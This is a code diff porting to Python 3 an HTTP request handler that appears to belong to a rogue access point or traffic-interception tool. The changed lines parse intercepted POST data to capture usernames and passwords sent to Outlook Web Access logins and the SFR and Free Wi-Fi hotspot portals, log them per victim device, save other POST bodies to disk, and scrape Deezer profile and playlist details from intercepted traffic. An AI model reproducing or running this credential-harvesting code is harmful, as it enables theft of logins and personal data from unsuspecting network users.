@@ -426,7 +426,7 @@ class HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
       elif path == 'owa/auth.owa':
         
         try:
-          kvs = dict([ kv.split('=') for kv in urllib.parse.unquote(post).split('&')])
+          kvs = dict([ kv.split('=') for kv in urllib.parse.unquote(post.decode('utf8')).split('&')])
           self.server.app.log( "%s login is %s"%(fullpath, 
             ctxt("%s:%s"%(kvs['username'], kvs['password']),RED)) )
           user = {'uri':fullpath,'login': kvs['username'],  'password':kvs['password']}
@@ -434,13 +434,13 @@ class HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
         except:
           raise
       elif host == 'hotspot.wifi.sfr.fr':
-        kvs = dict([ kv.split('=') for kv in urllib.parse.unquote(post).split('&')])
+        kvs = dict([ kv.split('=') for kv in urllib.parse.unquote(post.decode('utf8')).split('&')])
         self.server.app.log( "%s login is %s"%(fullpath, 
             ctxt("%s:%s"%(kvs['username'], kvs['password']),RED)) )
         user = {'uri':fullpath,'login': kvs['username'],  'password':kvs['password']}
         client.log_login(user)
       elif host == 'wifi.free.fr':
-        kvs = dict([ kv.split('=') for kv in urllib.parse.unquote(post).split('&')])
+        kvs = dict([ kv.split('=') for kv in urllib.parse.unquote(post.decode('utf8')).split('&')])
         self.server.app.log( "%s login is %s"%(fullpath, 
             ctxt("%s:%s"%(kvs['login'], kvs['password']),RED)) )
         user = {'uri':fullpath,'login': kvs['login'],  'password':kvs['password']}
@@ -450,7 +450,7 @@ class HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
         bssid = client.bssid
         name = os.path.join(self.server.app.logpath,"%s_%s_%d_post"%(bssid,host,1000*time.time()))
         client.register_post(fullpath,name)
-        f = open(name,'w')
+        f = open(name,'wb')
         f.write(post)
         f.close()
         self.server.app.log( "[+] %s from %s to %s (%s)"%(ctxt("saved post request",GREEN), client.bssid, fullpath, name))
@@ -466,7 +466,7 @@ class HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
     self.end_headers()
     
     if host == "api.deezer.com" and path == "1.0/gateway.php":
-      deezer = self.parse_deezer_json(json.loads(post))
+      deezer = self.parse_deezer_json(json.loads(post.decode('utf-8')))
       client.set_deezer_infos(deezer)
       
   def parse_deezer_json(self, data):
@@ -482,7 +482,7 @@ class HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
         uri ='%s%s'%(track_uri,data['params']['media']['id'])
         try:
           response = urllib.request.urlopen(uri)
-          html = response.read()
+          html = response.read().decode('utf8')
           res = re.findall('<meta property="og:image" content="(.*)">',html)
           thumbnail = res[0]
           
@@ -501,7 +501,7 @@ class HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
         if data['params']['ctxt']['t'] == 'playlist_page':
           try:
             response = urllib.request.urlopen('%s%s'%(playlist_uri,data['params']['ctxt']['id']))
-            html = response.read()
+            html = response.read().decode('utf8')
             res = re.findall('<a\shref="/profile/(\d+)".*>(.*)</a>',html)
             deezer_data['user'] = {
                 'id' : res[0][0],
